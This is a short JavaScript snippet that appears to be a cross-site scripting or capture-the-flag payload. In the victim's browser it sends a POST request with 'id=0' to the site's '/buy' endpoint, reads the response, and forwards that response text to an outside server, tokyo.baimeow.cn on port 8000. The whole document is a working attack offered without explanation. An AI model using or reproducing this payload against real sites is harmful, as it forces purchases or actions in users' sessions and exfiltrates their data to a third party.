(async ()=>{
    let res = await fetch("/buy", { method: "POST", body: "id=0" ,headers: { "Content-Type": "application/x-www-form-urlencoded" }});
    let txt = await res.text();
    fetch("http://tokyo.baimeow.cn:8000/", { method: "POST", body: txt });
})()
